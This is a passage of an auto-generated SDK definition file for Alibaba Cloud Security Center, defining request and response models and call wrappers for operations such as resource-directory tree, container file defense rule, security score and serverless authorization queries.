 *
 * @return GetPublishCronResponse
 */
async function getPublishCron(): GetPublishCronResponse {
  var runtime = new Util.RuntimeOptions{};
  return getPublishCronWithOptions(runtime);
}

model GetRdTreeResponseBody = {
  data?: {
    children?: [ any ](name='Children', description='The subfolder.'),
    folderId?: string(name='FolderId', description='The ID of the folder in the resource directory.', example='fd-CGA73I****'),
    folderName?: string(name='FolderName', description='The name of the folder.', example='Root'),
  }(name='Data', description='The processing result.'),
  requestId?: string(name='RequestId', description='The request ID.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model GetRdTreeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetRdTreeResponseBody(name='body'),
}

/**
 * @summary Queries the organizational structure of a resource directory by using the multi-account management feature.
 *
 * @description You can call this operation only by using the management account of a resource directory or a delegated administrator account of Security Center.
 *
 * @param request GetRdTreeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetRdTreeResponse
 */
async function getRdTreeWithOptions(runtime: Util.RuntimeOptions): GetRdTreeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetRdTree',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the organizational structure of a resource directory by using the multi-account management feature.
 *
 * @description You can call this operation only by using the management account of a resource directory or a delegated administrator account of Security Center.
 *
 * @return GetRdTreeResponse
 */
async function getRdTree(): GetRdTreeResponse {
  var runtime = new Util.RuntimeOptions{};
  return getRdTreeWithOptions(runtime);
}

model GetRegistryScanDayNumResponseBody = {
  requestId?: string(name='RequestId', description='The ID of this request, a unique identifier generated by Alibaba Cloud for the request, which can be used to troubleshoot and locate issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
  scanDayNumConfig?: {
    dayNumList?: string(name='DayNumList', description='List of alternative days.', example='1,3,7,15,30,90,180,365'),
    scanDayNum?: int32(name='ScanDayNum', description='Scan time range, in days.', example='7'),
  }(name='ScanDayNumConfig', description='Configuration of scan days.'),
}

model GetRegistryScanDayNumResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetRegistryScanDayNumResponseBody(name='body'),
}

/**
 * @summary Query Image Scan Period.
 *
 * @param request GetRegistryScanDayNumRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetRegistryScanDayNumResponse
 */
async function getRegistryScanDayNumWithOptions(runtime: Util.RuntimeOptions): GetRegistryScanDayNumResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetRegistryScanDayNum',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query Image Scan Period.
 *
 * @return GetRegistryScanDayNumResponse
 */
async function getRegistryScanDayNum(): GetRegistryScanDayNumResponse {
  var runtime = new Util.RuntimeOptions{};
  return getRegistryScanDayNumWithOptions(runtime);
}

model GetRulesCountResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
  totalSystemClientRuleCount?: long(name='TotalSystemClientRuleCount', description='The total number of system defense rules.', example='10'),
  totalUserDefineRuleCount?: long(name='TotalUserDefineRuleCount', description='The total number of custom defense rules.', example='10'),
}

model GetRulesCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetRulesCountResponseBody(name='body'),
}

/**
 * @summary Queries the numbers of system defense rules and custom defense rules.
 *
 * @param request GetRulesCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetRulesCountResponse
 */
async function getRulesCountWithOptions(runtime: Util.RuntimeOptions): GetRulesCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetRulesCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the numbers of system defense rules and custom defense rules.
 *
 * @return GetRulesCountResponse
 */
async function getRulesCount(): GetRulesCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getRulesCountWithOptions(runtime);
}

model GetSasContainerWebDefenseRuleRequest {
  ruleId?: long(name='RuleId', description='Rule ID.
> You can call the [ListSasContainerWebDefenseRule](~~ListSasContainerWebDefenseRule~~) API to get this parameter.', example='1600009'),
}

model GetSasContainerWebDefenseRuleResponseBody = {
  containerWebDefenseRule?: {
    aliUid?: long(name='AliUid', description='User ID.', example='1000**0002'),
    appTotalCount?: int32(name='AppTotalCount', description='Total number of applications.', example='1'),
    gmtCreate?: long(name='GmtCreate', description='Timestamp when the rule was created. Unit: milliseconds.', example='1709173360000'),
    gmtModified?: long(name='GmtModified', description='Timestamp when the rule was last modified. Unit: milliseconds.', example='1655432638000'),
    id?: long(name='Id', description='Rule ID.', example='100'),
    pathConfDTOList?: [ 
      {
        backupPath?: string(name='BackupPath', description='Backup path.', example='/usr/path/'),
        defenseMode?: string(name='DefenseMode', description='Action to be executed.
- **block** : Block
- **audit** : Alert', example='audit'),
        defensePath?: string(name='DefensePath', description='Defense path', example='/test11*'),
        excludeFile?: string(name='ExcludeFile', description='Excluded files.', example='file1'),
        excludeFilePath?: string(name='ExcludeFilePath', description='Excluded file path.', example='/test2/sub1,/test2/sub2'),
        excludeFileType?: string(name='ExcludeFileType', description='Exclude file types.', example='doc'),
        guardType?: int32(name='GuardType', description='Protection mode.
- **0**: Basic mode (whitelist)
- **1**: Advanced mode (blacklist)', example='0'),
        includeFile?: string(name='IncludeFile', description='Included files.', example='webapp'),
        includeFileType?: string(name='IncludeFileType', description='Type of included files.', example='doc'),
        processPathList?: [ string ](name='ProcessPathList', description='Whitelist process list.'),
      }
    ](name='PathConfDTOList', description='List of configured file paths.'),
    ruleName?: string(name='RuleName', description='Rule name.', example='FiledefenseRule.'),
    ruleStatus?: int32(name='RuleStatus', description='Rule status. The value descriptions are as follows:

- **1**: Enabled
- **0**: Disabled', example='1'),
  }(name='ContainerWebDefenseRule', description='Details of the container file defense rule.'),
  requestId?: string(name='RequestId', description='The ID of the current request, which is a unique identifier generated by Alibaba Cloud for this request and can be used for troubleshooting and issue localization.', example='BA674E4**62FB5133'),
}

model GetSasContainerWebDefenseRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetSasContainerWebDefenseRuleResponseBody(name='body'),
}

/**
 * @summary Get Container File Defense Rule Details.
 *
 * @param request GetSasContainerWebDefenseRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetSasContainerWebDefenseRuleResponse
 */
async function getSasContainerWebDefenseRuleWithOptions(request: GetSasContainerWebDefenseRuleRequest, runtime: Util.RuntimeOptions): GetSasContainerWebDefenseRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSasContainerWebDefenseRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get Container File Defense Rule Details.
 *
 * @param request GetSasContainerWebDefenseRuleRequest
 * @return GetSasContainerWebDefenseRuleResponse
 */
async function getSasContainerWebDefenseRule(request: GetSasContainerWebDefenseRuleRequest): GetSasContainerWebDefenseRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSasContainerWebDefenseRuleWithOptions(request, runtime);
}

model GetSasContainerWebDefenseRuleApplicationRequest {
  ruleId?: long(name='RuleId', description='The ID of the rule.

>  You can call the ListSasContainerWebDefenseRule operation to query the IDs of rules.', example='400599'),
}

model GetSasContainerWebDefenseRuleApplicationResponseBody = {
  containerWebDefenseAppList?: [ 
    {
      aliUid?: long(name='AliUid', description='The user ID.', example='5944922169365****'),
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  The IDs of clusters can be obtained by using the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation.', example='cfb41a869c71e4678a97021582dd8****'),
      gmtCreate?: long(name='GmtCreate', description='The time when the application was created. Unit: milliseconds.', example='1677839038000'),
      gmtModified?: long(name='GmtModified', description='The last modification time. Unit: milliseconds.', example='1667891185000'),
      id?: long(name='Id', description='The ID of the node.', example='143761'),
      ruleId?: long(name='RuleId', description='The ID of the rule.', example='403327'),
      tag?: string(name='Tag', description='The value of the application label.', example='app:test'),
    }
  ](name='ContainerWebDefenseAppList', description='The applications.'),
  requestId?: string(name='RequestId', description='The request ID.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model GetSasContainerWebDefenseRuleApplicationResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetSasContainerWebDefenseRuleApplicationResponseBody(name='body'),
}

/**
 * @summary Queries the applications that are specified in a rule for container tamper-proofing.
 *
 * @param request GetSasContainerWebDefenseRuleApplicationRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetSasContainerWebDefenseRuleApplicationResponse
 */
async function getSasContainerWebDefenseRuleApplicationWithOptions(request: GetSasContainerWebDefenseRuleApplicationRequest, runtime: Util.RuntimeOptions): GetSasContainerWebDefenseRuleApplicationResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSasContainerWebDefenseRuleApplication',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the applications that are specified in a rule for container tamper-proofing.
 *
 * @param request GetSasContainerWebDefenseRuleApplicationRequest
 * @return GetSasContainerWebDefenseRuleApplicationResponse
 */
async function getSasContainerWebDefenseRuleApplication(request: GetSasContainerWebDefenseRuleApplicationRequest): GetSasContainerWebDefenseRuleApplicationResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSasContainerWebDefenseRuleApplicationWithOptions(request, runtime);
}

model GetSasContainerWebDefenseRuleCriteriaRequest {
  value?: string(name='Value', description='The value of the search condition. Fuzzy match is supported.', example='525'),
}

model GetSasContainerWebDefenseRuleCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.', example='name'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: You must manually enter the search condition.
*   **select**: You must select a search condition from the **Values** drop-down list.', example='select'),
      values?: string(name='Values', description='The values of the search condition. This parameter is returned only if the value of **Type** is **select**.

>  If the value of **Type** is **input**, the value of this parameter is empty.', example='athor_bid'),
    }
  ](name='CriteriaList', description='The search conditions.'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model GetSasContainerWebDefenseRuleCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetSasContainerWebDefenseRuleCriteriaResponseBody(name='body'),
}

/**
 * @summary Queries search conditions that can be used to search for container file protection rules.
 *
 * @param request GetSasContainerWebDefenseRuleCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetSasContainerWebDefenseRuleCriteriaResponse
 */
async function getSasContainerWebDefenseRuleCriteriaWithOptions(request: GetSasContainerWebDefenseRuleCriteriaRequest, runtime: Util.RuntimeOptions): GetSasContainerWebDefenseRuleCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSasContainerWebDefenseRuleCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries search conditions that can be used to search for container file protection rules.
 *
 * @param request GetSasContainerWebDefenseRuleCriteriaRequest
 * @return GetSasContainerWebDefenseRuleCriteriaResponse
 */
async function getSasContainerWebDefenseRuleCriteria(request: GetSasContainerWebDefenseRuleCriteriaRequest): GetSasContainerWebDefenseRuleCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSasContainerWebDefenseRuleCriteriaWithOptions(request, runtime);
}

model GetSecurityScoreRuleRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
}

model GetSecurityScoreRuleResponseBody = {
  enableStatus?: boolean(name='EnableStatus', description='The status of the custom settings of the security score feature.

*   true: enabled
*   false: disabled', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  securityScoreRuleList?: [ 
    {
      ruleType?: string(name='RuleType', description='The deduction module that is supported by the security score feature. Valid values:

*   SS_REINFORCE: issue in key feature configuration
*   SS_ALARM: unhandled alert
*   SS_VUL: unfixed vulnerability
*   SS_HC: baseline risk
*   SS_CLOUD_HC: risk item of configuration assessment
*   SS_AK: risk of AccessKey pair leaks', example='SS_ALARM'),
      score?: int32(name='Score', description='The deduction threshold of the deduction module.

>  Valid values: 0 to 100. The sum of the deduction thresholds for all deduction modules must be equal to 100.', example='20'),
      securityScoreItemList?: [ 
        {
          score?: int32(name='Score', description='The penalty point of the deduction item.', example='3'),
          scoreThreshold?: int32(name='ScoreThreshold', description='The threshold for the deduction item.

>  Valid values: 0 to the deduction threshold of the deduction module.', example='5'),
          subRuleType?: string(name='SubRuleType', description='The deduction item of the deduction module. The following list describes the deduction modules and their deduction items:

*   SS_REINFORCE: issue in key feature configuration

    *   XPRESS_INSTALL: Security Center is not authorized.
    *   REINFORCE_SUSPICIOUS: The antivirus feature is disabled.
    *   RANSOMWARE: The anti-ransomware policy is disabled.
    *   WEB_LOCK: The web tamper proofing feature is disabled.
    *   VIRUS_SCHEDULE_SCAN: The periodic virus scan policy is disabled.
    *   IMAGE_REPO_SCAN: The range of container image scan is not configured.
    *   IMAGE_SCAN_TASK: The feature of one-click scan of container images for security risks is not performed.

*   SS_ALARM: unhandled alert.

    *   ALARM_SERIOUS: An unhandled high-risk alert event is detected.
    *   ALARM_SUSPICIOUS: An unhandled medium-risk alarm event is detected.
    *   ALARM_REMIND: An unhandled low-risk alarm event is detected.

*   SS_VUL: unfixed vulnerability

    *   CMS_UNFIX: An unfixed Web-CMS vulnerability is detected.
    *   WIN_UNFIX: An unfixed Windows host vulnerability is detected.
    *   CVE_UNFIX: An unfixed Linux host vulnerability is detected.
    *   ERM_UNFIX: An unfixed urgent vulnerability is detected.
    *   ERM_UNCHECK: An undetected urgent vulnerability exists.

*   SS_HC: baseline risks

    *   WEAK_EXPLOIT: Weak passwords are exposed to the Internet.
    *   WEAK_PASSWORD: Weak passwords exist.
    *   HC_EXPLOIT: The data source may be hacked.
    *   HC_OTHER_WARNING: Security configuration risks exist.

*   SS_CLOUD_HC: Cloud platform configuration check item problem.

    *   CSPM_CIEM_NOT_PASS: A CIEM check item failed the check.
    *   CSPM_RISK_NOT_PASS: A security risk check item failed the check.
    *   CSPM_COMPLIANCE_NOT_PASS: A compliance check item failed the check.

*   SS_AK: risk of AccessKey pair leaks', example='ALARM_SERIOUS'),
          title?: string(name='Title', description='The description of the deduction item in a deduction module.', example='Unhandled Urgent Alert Event Exists'),
        }
      ](name='SecurityScoreItemList', description='The deduction items of the deduction module.'),
      title?: string(name='Title', description='The description of the deduction module.', example='Unhandled Alerts'),
    }
  ](name='SecurityScoreRuleList', description='The list of deduction modules that are supported by the security score feature.'),
}

model GetSecurityScoreRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetSecurityScoreRuleResponseBody(name='body'),
}

/**
 * @summary Queries the details of the deduction modules of the security score feature, including custom settings.
 *
 * @param request GetSecurityScoreRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetSecurityScoreRuleResponse
 */
async function getSecurityScoreRuleWithOptions(request: GetSecurityScoreRuleRequest, runtime: Util.RuntimeOptions): GetSecurityScoreRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSecurityScoreRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of the deduction modules of the security score feature, including custom settings.
 *
 * @param request GetSecurityScoreRuleRequest
 * @return GetSecurityScoreRuleResponse
 */
async function getSecurityScoreRule(request: GetSecurityScoreRuleRequest): GetSecurityScoreRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSecurityScoreRuleWithOptions(request, runtime);
}

model GetSensitiveDefineRuleConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  source?: string(name='Source', description='The source of the check rules. Valid values:

*   **image**: image.
*   **agentless**: agentless detection.', example='image'),
}

model GetSensitiveDefineRuleConfigResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: {
    enableNewRule?: int32(name='EnableNewRule', description='Indicates whether the new rule is enabled for automatic check only on agentless detection. Valid values:

*   **0**: disabled.
*   **1**: enabled.', example='0'),
    id?: long(name='Id', description='The custom configuration ID.', example='44616'),
    ruleCount?: int32(name='RuleCount', description='The total number of check rules.', example='100'),
    ruleTree?: [ 
      {
        classKey?: string(name='ClassKey', description='The category keyword of the check rule.', example='password'),
        className?: string(name='ClassName', description='The category name of the check rule.', example='password'),
        ruleList?: [ 
          {
            ruleKey?: string(name='RuleKey', description='The keyword of the check rule.', example='huaweicloud_ak'),
            ruleName?: string(name='RuleName', description='The name of the check rule.', example='huaweicloud_ak'),
            selected?: boolean(name='Selected', description='Indicates whether the check rule is selected. Valid values:

*   **true**
*   **false**', example='true'),
          }
        ](name='RuleList', description='The list of check rules.'),
      }
    ](name='RuleTree', description='The tree of the check rules.'),
    selectedCount?: int32(name='SelectedCount', description='The number of selected check rules.', example='99'),
  }(name='Data', description='The response parameters.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='7E0618A9-D5EF-4220-9471-C42B5E92****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetSensitiveDefineRuleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetSensitiveDefineRuleConfigResponseBody(name='body'),
}

/**
 * @summary Queries the check rules of sensitive files.
 *
 * @param request GetSensitiveDefineRuleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetSensitiveDefineRuleConfigResponse
 */
async function getSensitiveDefineRuleConfigWithOptions(request: GetSensitiveDefineRuleConfigRequest, runtime: Util.RuntimeOptions): GetSensitiveDefineRuleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetSensitiveDefineRuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the check rules of sensitive files.
 *
 * @param request GetSensitiveDefineRuleConfigRequest
 * @return GetSensitiveDefineRuleConfigResponse
 */
async function getSensitiveDefineRuleConfig(request: GetSensitiveDefineRuleConfigRequest): GetSensitiveDefineRuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getSensitiveDefineRuleConfigWithOptions(request, runtime);
}

model GetServerlessAppAuthDetailRequest {
  appId?: string(name='AppId', description='SAE application ID.

> Obtain through the [ListMachineApps](~~ListMachineApps~~) interface.', example='3de9f2ac-f***769226df'),
  appRegionId?: string(name='AppRegionId', description='Application region ID.', example='cn-hangzhou'),
  machineType?: string(name='MachineType', description='Server type: 
- **RunD**
- **ECI**', example='RunD'),
  vendorType?: string(name='VendorType', description='Cloud product: 
- **ASK**
- **SAE**
- **ACS**', example='SAE'),
}

model GetServerlessAppAuthDetailResponseBody = {
  data?: {
    appId?: string(name='AppId', description='Application ID.', example='c932b7a0***'),
    coreCount?: int32(name='CoreCount', description='Number of CPU cores.', example='2'),
    instanceCount?: int32(name='InstanceCount', description='Number of instances.', example='1'),
    isBind?: boolean(name='IsBind', description='Whether authorization is bound. Values: 

- **true**: Yes
- **false**: No', example='true'),
    isPostPaid?: boolean(name='IsPostPaid', description='Whether it is a post-paid instance. Values: 

- **true**: Yes
- **false**: No', example='true'),
    isServerlessPostPaidValid?: boolean(name='IsServerlessPostPaidValid', description='Serverless post-paid status. Values: 
- **true**: Active
- **false**: Expired', example='true'),
    postPaidModuleSwitch?: string(name='PostPaidModuleSwitch', description='Pay-as-you-go module switch. Values: 

- **VUL**: Vulnerability repair module
- **CSPM**: Cloud Security Posture Management module
- **AGENTLESS**: Agentless detection module
- **SERVERLESS**: Serverless security module
- **CTDR**: Threat Detection and Response module', example='SERVERLESS'),
    postPaidOpenTime?: long(name='PostPaidOpenTime', description='Post-paid activation time.', example='1655432638000'),
    postPaidStatus?: int32(name='PostPaidStatus', description='Post-paid instance status. Values: 
- **1**: Active
- **2**: Suspended due to unpaid bills', example='1'),
    postpaidInstanceId?: string(name='PostpaidInstanceId', description='Post-paid instance ID.', example='101'),
  }(name='Data', description='Data details.'),
  requestId?: string(name='RequestId', description='The ID of this call request, a unique identifier generated by Alibaba Cloud for the request, which can be used to troubleshoot and pinpoint issues.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
  success?: boolean(name='Success', description='Whether the API call was successful. Values: 
- **true**: Success
- **false**: Failure', example='true'),
}

model GetServerlessAppAuthDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetServerlessAppAuthDetailResponseBody(name='body'),
}

/**
 * @summary Get Serverless Application Authorization Details
 *
 * @param request GetServerlessAppAuthDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetServerlessAppAuthDetailResponse
 */
async function getServerlessAppAuthDetailWithOptions(request: GetServerlessAppAuthDetailRequest, runtime: Util.RuntimeOptions): GetServerlessAppAuthDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appId)) {
    query['AppId'] = request.appId;
  }
  if (!Util.isUnset(request.appRegionId)) {
    query['AppRegionId'] = request.appRegionId;
  }
  if (!Util.isUnset(request.machineType)) {
    query['MachineType'] = request.machineType;
  }
  if (!Util.isUnset(request.vendorType)) {
    query['VendorType'] = request.vendorType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetServerlessAppAuthDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get Serverless Application Authorization Details
 *
 * @param request GetServerlessAppAuthDetailRequest
 * @return GetServerlessAppAuthDetailResponse
 */
async function getServerlessAppAuthDetail(request: GetServerlessAppAuthDetailRequest): GetServerlessAppAuthDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getServerlessAppAuthDetailWithOptions(request, runtime);
}

model GetServerlessAuthSummaryRequest {
  appRegionId?: string(name='AppRegionId', description='Application region ID.', example='cn-hangzhou'),
  machineType?: string(name='MachineType', description='Server type: 
- **RunD**
- **ECI**', example='RunD'),
  vendorType?: string(name='VendorType', description='Cloud product: 
- **ASK**
- **SAE**
- **ACS**', example='SAE'),
}

model GetServerlessAuthSummaryResponseBody = {
  data?: {
    autoBind?: int32(name='AutoBind', description='Enable auto-binding. Values: 

- **0**: Disabled
- **1**: Enabled', example='1'),
    hasPreBindSetting?: boolean(name='HasPreBindSetting', description='Indicates whether there is a pre-bound asset configuration. Pre-binding refers to the asset binding configuration selected in advance at the time of purchase. The values are: - **0**: No - **1**: Yes', example='1'),
    isPostPaid?: boolean(name='IsPostPaid', description='Whether it is a post-paid instance. Values: 

- **true**: Yes
- **false**: No', example='true'),
    isServerlessPostPaidValid?: boolean(name='IsServerlessPostPaidValid', description='Serverless post-paid status. Values: 
- **true**: Active
- **false**: Expired', example='true'),
    postPaidModuleSwitch?: string(name='PostPaidModuleSwitch', description='Pay-as-you-go module switch. Values: 

- **VUL**: Vulnerability Repair Module
- **CSPM**: Cloud Security Posture Management Module
- **AGENTLESS**: Agentless Detection Module
- **SERVERLESS**: Serverless Security Module
- **CTDR**: Threat Analysis and Response Module', example='SERVERLESS'),
    postPaidOpenTime?: long(name='PostPaidOpenTime', description='Post-paid activation time. Unit: milliseconds.', example='1655432638000'),
    postPaidStatus?: int32(name='PostPaidStatus', description='Post-paid instance status. Values: 
- **1**: Active
- **2**: Suspended due to unpaid bills', example='1'),
    postpaidInstanceId?: string(name='PostpaidInstanceId', description='Post-paid instance ID.', example='sas-postpay-**'),
    regionId?: string(name='RegionId', description='Region ID.', example='cn-hangzhou'),
    totalBindAppCount?: int32(name='TotalBindAppCount', description='Total number of bound applications.', example='10'),
    totalBindCoreCount?: int32(name='TotalBindCoreCount', description='Total number of bound cores.', example='1'),
    totalBindInstanceCount?: int32(name='TotalBindInstanceCount', description='Total number of bound instances.', example='1'),
    totalUnBindAppCount?: int32(name='TotalUnBindAppCount', description='Total number of unbound applications.', example='1'),
    totalUnBindCoreCount?: int32(name='TotalUnBindCoreCount', description='Total number of unbound cores.', example='1'),
    totalUnBindInstanceCount?: int32(name='TotalUnBindInstanceCount', description='Total number of unbound instances.', example='2'),
  }(name='Data', description='Returned data details.'),
  requestId?: string(name='RequestId', description='The ID of this request, which is a unique identifier generated by Alibaba Cloud for this request. It can be used to troubleshoot and locate issues.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
  success?: boolean(name='Success', description='Indicates whether the API call was successful. Values:
- **true**: Success
- **false**: Failure', example='true'),
}

model GetServerlessAuthSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetServerlessAuthSummaryResponseBody(name='body'),
}

/**
 * @summary Get Serverless Authorization Overview
 *
 * @param request GetServerlessAuthSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetServerlessAuthSummaryResponse
 */
async function getServerlessAuthSummaryWithOptions(request: GetServerlessAuthSummaryRequest, runtime: Util.RuntimeOptions): GetServerlessAuthSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appRegionId)) {
    query['AppRegionId'] = request.appRegionId;
  }
  if (!Util.isUnset(request.machineType)) {
    query['MachineType'] = request.machineType;
  }
  if (!Util.isUnset(request.vendorType)) {
    query['VendorType'] = request.vendorType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetServerlessAuthSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
